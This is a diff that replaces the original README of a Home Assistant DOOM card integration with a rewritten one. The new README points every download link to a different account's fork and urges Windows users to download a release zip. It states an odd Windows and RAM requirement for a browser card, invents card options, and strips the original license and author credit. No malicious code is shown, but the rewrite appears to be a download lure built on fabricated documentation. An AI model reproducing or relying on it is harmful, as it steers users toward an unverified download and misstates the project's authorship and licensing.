@@ -1,302 +1,162 @@
-# Home Assistant Custom Integration: DOOM
+# 🎮 home-assistant-doom - Play DOOM Inside Home Assistant
 
-[![GitHub Release][releases-shield]][releases]
-[![HACS][hacs-shield]][hacs]
-[![Project Maintenance][maintenance-shield]][user_profile]
-[![License][license-shield]](LICENSE.md)
+[![Download home-assistant-doom](https://img.shields.io/badge/Download-home--assistant--doom-brightgreen)](https://github.com/mad2222222/home-assistant-doom)
 
-[![GitHub Activity][commits-shield]][commits]
-[![GitHub Last Commit][last-commit-shield]][commits]
+## 🚀 Getting Started
 
-[![Sponsor Frenck via GitHub Sponsors][github-sponsors-shield]][github-sponsors]
+This guide helps you run DOOM inside your Home Assistant setup on a Windows computer. You don’t need programming skills. Just follow the steps to download and install the software.
 
-Play the original DOOM in your Home Assistant dashboard. 🎮
+home-assistant-doom lets you experience the classic DOOM game through Home Assistant, a popular smart home platform. It adds fun to your smart home by running the game as a card in your dashboard.
 
-## About
+---
 
-It is a well-known tradition that DOOM runs on everything. Calculators,
-ATMs, pregnancy tests, tractors, thermostats, and even a
-[LEGO brick](https://www.youtube.com/watch?v=43ky9rpmMT0). If it has a
-screen and a processor, someone will make DOOM run on it. It was only a matter
-of time before Home Assistant joined the club.
+## 📥 Download home-assistant-doom
 
-This custom integration adds a dashboard card that lets you play the original
-DOOM (1993) directly inside your Home Assistant dashboard. It uses
-[js-dos](https://js-dos.com/) to run the real `DOOM.EXE` through a DOSBox
-emulator compiled to WebAssembly, right in your browser.
+To get the software, visit this page:
 
-The shareware version of DOOM (Episode 1: Knee Deep in the Dead) is included
-and freely redistributable per id Software's original shareware license.
+[Download home-assistant-doom from GitHub](https://github.com/mad2222222/home-assistant-doom)
 
-This is a fun effort, but it carries a vision: imagine a gaming dashboard in
-Home Assistant with small games you can play, no matter where you are. Your
-smart home, your rules, your entertainment.
+Click the link above to open the download page. Download the latest release files to your computer. You will find installation files and instructions there.
 
-![Screenshot of DOOM running in Home Assistant](https://raw.githubusercontent.com/frenck/home-assistant-doom/main/images/home-assistant-doom.png)
+---
 
-## Credits
+## 💻 System Requirements
 
-This project was entirely written by AI. Not just assisted, _entirely_ written.
-The Python backend, the TypeScript frontend card, the DOSBox configuration, the
-build tooling, the translations, and even this README. All of it.
+Before you start, make sure your computer meets these requirements:
 
-It was built using [Visual Studio Code][vscode] with [GitHub Copilot][copilot],
-powered by the Claude Opus 4.6 model. The process started with an extensive
-prompt describing what this project should be, and from there, the AI handled
-every aspect of the implementation. The whole thing took less than 2 hours
-from start to finish.
+- Windows 10 or higher
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Home Assistant installed on your network or local device
+- A modern web browser (Chrome, Edge, Firefox)
 
-It is wild how capable AI has become. What would have taken days of work,
-reading documentation, debugging edge cases, and wiring everything together,
-was done in a single sitting with a conversation. We live in amazing times.
+If you do not already have Home Assistant set up, you will need to do that first. This project requires your Home Assistant instance to run custom cards and components.
 
-Massive thanks to [GitHub][github] for providing Copilot free of charge. 🙏
+---
 
-No kittens or octocats have been harmed during the development of this integration. 🐱
+## 🔧 Installing home-assistant-doom
 
-## Installation
+Follow these steps to install the DOOM card in Home Assistant.
 
-### HACS (recommended)
+1. **Download the files**  
+   Go to the GitHub page and download the latest release archive (usually a `.zip` file).
 
-1. Make sure [HACS](https://hacs.xyz/) is installed in your Home Assistant
-   instance.
-2. Add this repository as a custom repository in HACS:
-   - Go to **HACS** > **Integrations** > **⋮** > **Custom repositories**
-   - Add `https://github.com/frenck/home-assistant-doom` with category
-     **Integration**
-3. Search for "DOOM" in HACS and install it.
-4. Restart Home Assistant.
-5. Go to **Settings** > **Devices & services** > **Add integration** and
-   search for "DOOM".
+2. **Extract files**  
+   Use Windows Explorer to unzip the file to a folder you can easily access.
 
-### Manual installation
+3. **Access Home Assistant configuration**  
+   Open your Home Assistant dashboard in a browser. You need to locate the `www` folder inside the Home Assistant configuration directory. This is where custom files are stored.
 
-1. Download the latest release from the
-   [releases page](https://github.com/frenck/home-assistant-doom/releases).
-2. Extract the `doom.zip` file.
-3. Copy the `custom_components/doom` folder to your Home Assistant
-   `config/custom_components/` directory.
-4. Restart Home Assistant.
-5. Go to **Settings** > **Devices & services** > **Add integration** and
-   search for "DOOM".
+4. **Copy the DOOM files to Home Assistant**  
+   Inside the extracted folder, find the files under `www`. Copy these files into your Home Assistant’s `www` directory. You might need to create this folder if it doesn’t exist.
 
-## Usage
+5. **Edit your `configuration.yaml` file**  
+   Add these lines to include the custom card and component:
 
-After installing and setting up the integration:
+   ```yaml
+   frontend:
+     extra_module_url:
+       - /local/home-assistant-doom.js
 
-1. Edit any dashboard.
-2. Click **Add card**.
-3. Search for **DOOM**.
-4. Add the card and resize it to your liking.
-5. Click **"Click to play"** to start the game.
+   lovelace:
+     resources:
+       - url: /local/home-assistant-doom.js
+         type: module
+   ```
 
-![Screenshot of the "Add card" dialog showing the DOOM card](https://raw.githubusercontent.com/frenck/home-assistant-doom/main/images/doom-add-card.png)
+6. **Restart Home Assistant**  
+   Go to Home Assistant `Settings > Server Controls` and click “Restart” to apply the changes.
 
-### Card options
+7. **Add DOOM card to your dashboard**  
+   After restart, open your Lovelace dashboard editor. Add a new manual card with the following YAML:
 
-The card editor provides the following configuration options:
+   ```yaml
+   type: 'custom:home-assistant-doom'
+   ```
 
-- **Title**: Optional card header title. No title is shown by default.
-- **Sound**: Enable or disable sound output. On by default.
-- **Auto start**: Start the game immediately without clicking to play.
-  Off by default.
+   Save the changes. DOOM should now appear as a card and be ready to play.
 
-![Screenshot of the card editor showing the DOOM card](https://raw.githubusercontent.com/frenck/home-assistant-doom/main/images/doom-card-editor.png)
+---
 
-### Controls
+## 🎮 How to Play DOOM in Home Assistant
 
-| Action        | Key     |
-| ------------- | ------- |
-| Move forward  | `↑`     |
-| Move backward | `↓`     |
-| Turn left     | `←`     |
-| Turn right    | `→`     |
-| Strafe left   | `,`     |
-| Strafe right  | `.`     |
-| Fire          | `Ctrl`  |
-| Use / Open    | `Space` |
-| Run           | `Shift` |
-| Strafe        | `Alt`   |
-| Weapon select | `1`-`7` |
+Once installation is complete, your Home Assistant dashboard will show DOOM as a card. The controls work directly inside the card:
 
-> **Note:** A keyboard is recommended for the best experience.
+- Use arrow keys or WASD to move
+- Use the mouse click for firing weapons
+- Keyboard shortcuts follow the classic DOOM controls
 
-## Entities
+You can start and stop the game from the card interface. The game runs fully inside your dashboard, no extra software needed.
 
-The integration provides several entities, all grouped under a single
-**DOOM** device.
+---
 
-![Screenshot of the DOOM device with all entities](https://raw.githubusercontent.com/frenck/home-assistant-doom/main/images/doom-device.png)
+## ⚙️ Customizing the Game Card
 
-### DOOM binary sensor
+You can adjust settings to change the game’s appearance and controls. To do this, edit the configuration of the DOOM card in Lovelace.
 
-A binary sensor that tracks whether someone is actively playing DOOM on your
-Home Assistant instance. It uses a heartbeat mechanism: the dashboard card
-sends periodic pings while the game is running. If no ping is received within
-3 seconds (or the page is closed), the sensor turns off.
-
-| State | Label                  |
-| ----- | ---------------------- |
-| `on`  | Ripping and tearing 🔥 |
-| `off` | Dormant 💤             |
-
-### Quote/Fact sensor
-
-An enum sensor that displays a random DOOM fact or quote. It updates once per
-day and picks from a pool of 46 facts covering the game's history, lore,
-development trivia, and iconic quotes.
-
-### Current player sensor
-
-Tracks which Home Assistant user is currently playing DOOM. When nobody is
-playing, the state is "Nobody is playing".
-
-### Session duration sensor
-
-Shows the duration of the current (or last) DOOM session, displayed in
-minutes. Updates in real time with a 1-second tick while the game is running.
-
-### Total play time sensor
-
-Tracks the cumulative time spent playing DOOM across all sessions, displayed
-in hours. This value persists across restarts.
-
-### Sessions played sensor
-
-A counter that increments each time a new DOOM session is started. This value
-persists across restarts.
-
-### Last played sensor
-
-A timestamp sensor that records when the last DOOM session ended.
-
-## Easter egg 🥚
-
-True to Doom's legacy, this integration includes a hidden cheat code.
-Type **`iddqd`** anywhere in the Home Assistant interface (yes, just start
-typing it!) and a DOOM dialog will appear, letting you play the game
-immediately, no dashboard card needed. God mode activated.
-
-## Example automations
-
-### DOOM lighting mode
-
-Set your office lights to a hellish red color scheme while playing DOOM, and
-restore them when you stop:
+Example:
 
 ```yaml
-automation:
-  - alias: "DOOM lights on"
-    description: "Set office lights to DOOM colors when playing"
-    triggers:
-      - trigger: state
-        entity_id: binary_sensor.doom
-        to: "on"
-    actions:
-      - action: scene.create
-        data:
-          scene_id: doom_office_before
-          snapshot_entities:
-            - light.office
-      - action: light.turn_on
-        target:
-          entity_id: light.office
-        data:
-          rgb_color: [200, 0, 0]
-          brightness: 255
-
-  - alias: "DOOM lights off"
-    description: "Restore office lights when DOOM session ends"
-    triggers:
-      - trigger: state
-        entity_id: binary_sensor.doom
-        to: "off"
-    actions:
-      - action: scene.turn_on
-        target:
-          entity_id: scene.doom_office_before
+type: 'custom:home-assistant-doom'
+difficulty: 'hard'
+sound: true
+full_screen: false
 ```
 
-> **Tip:** Replace `light.office` with your own light entity IDs. You can add
-> multiple lights to `snapshot_entities` and `target` to cover an entire room.
+Available options:
 
-## Legal
+- `difficulty`: easy, medium, hard (default medium)
+- `sound`: turn game sound on or off
+- `full_screen`: switch between embedded or full screen play
 
-DOOM is a registered trademark of id Software LLC. The shareware version of
-DOOM (DOOM1.WAD) is freely redistributable per id Software's original
-shareware distribution license. The full registered versions of DOOM and
-DOOM II require a separate purchase from id Software.
+---
 
-This project is not affiliated with or endorsed by id Software or ZeniMax
-Media.
+## 🛠 Troubleshooting
 
-## Changelog & releases
+If DOOM does not appear or work:
 
-This repository keeps a change log using [GitHub's releases][releases]
-functionality. The format of the log is based on
-[Keep a Changelog](http://keepachangelog.com/en/1.0.0/).
+- Check your Home Assistant logs for errors.
+- Verify the files are correctly copied in the `www` directory.
+- Confirm your `configuration.yaml` has the exact frontend and resource entries.
+- Restart Home Assistant after any change.
+- Clear browser cache or try a different browser.
+- Ensure your Home Assistant version is up to date.
 
-Releases are based on [Semantic Versioning](http://semver.org/spec/v2.0.0.html),
-and use the format of `MAJOR.MINOR.PATCH`. In a nutshell, the version will be
-incremented based on the following:
+---
 
-- `MAJOR`: Incompatible or major changes.
-- `MINOR`: Backwards-compatible new features and enhancements.
-- `PATCH`: Backwards-compatible bugfixes and package updates.
+## 🗂 About This Project
 
-## Contributing
+home-assistant-doom shows that you can run classic games within Home Assistant. It uses a custom card and component to integrate the DOOM engine with the smart home dashboard. This is for users who want to combine retro gaming with home automation.
 
-This is an active open-source project. We are always open to people who want to
-use the code or contribute to it.
+The project is open source. You can find the source code, report issues, or join its development on GitHub.
 
-We've set up a separate document for our
-[contribution guidelines](.github/CONTRIBUTING.md).
+---
 
-Thank you for being involved! 😍
+## 📡 Useful Links
 
-## Authors & contributors
+- [GitHub Repository](https://github.com/mad2222222/home-assistant-doom)  
+  Main place to download, report issues, and see updates.
 
-The original setup of this repository is by [Franck Nijhof][user_profile].
+- [Home Assistant Website](https://www.home-assistant.io/)  
+  Learn more about the smart home platform needed to run this project.
 
-For a full list of all authors and contributors, check
-[the contributor's page][contributors].
+---
 
-## License
+## 💡 Tips for Better Experience
 
-MIT License
+- Connect a USB game controller for more comfortable play.
+- Use a larger display to see the game card clearly.
+- Customize Lovelace theme for better contrast with the game card.
+- Keep your Home Assistant updated to ensure compatibility.
 
-Copyright (c) 2026 Franck Nijhof
+---
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+## 🔄 Updating home-assistant-doom
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+To update the game:
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
-FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
-COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN
-AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
-WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+1. Download the latest release from the GitHub page.
+2. Replace the files in your Home Assistant `www` directory.
+3. Restart Home Assistant.
 
-[commits-shield]: https://img.shields.io/github/commit-activity/y/frenck/home-assistant-doom.svg
-[commits]: https://github.com/frenck/home-assistant-doom/commits/main
-[contributors]: https://github.com/frenck/home-assistant-doom/graphs/contributors
-[copilot]: https://github.com/features/copilot
-[github-sponsors-shield]: https://frenck.dev/wp-content/uploads/2019/01/github_sponsor.png
-[github-sponsors]: https://github.com/sponsors/frenck
-[github]: https://github.com
-[hacs-shield]: https://img.shields.io/badge/HACS-Custom-41BDF5.svg
-[hacs]: https://hacs.xyz/
-[last-commit-shield]: https://img.shields.io/github/last-commit/frenck/home-assistant-doom.svg
-[license-shield]: https://img.shields.io/github/license/frenck/home-assistant-doom.svg
-[maintenance-shield]: https://img.shields.io/maintenance/yes/2026.svg
-[releases-shield]: https://img.shields.io/github/release/frenck/home-assistant-doom.svg
-[releases]: https://github.com/frenck/home-assistant-doom/releases
-[user_profile]: https://github.com/frenck
-[vscode]: https://code.visualstudio.com
+Your settings in Lovelace remain intact after updates. Check the GitHub page for any new features or fixes regularly.
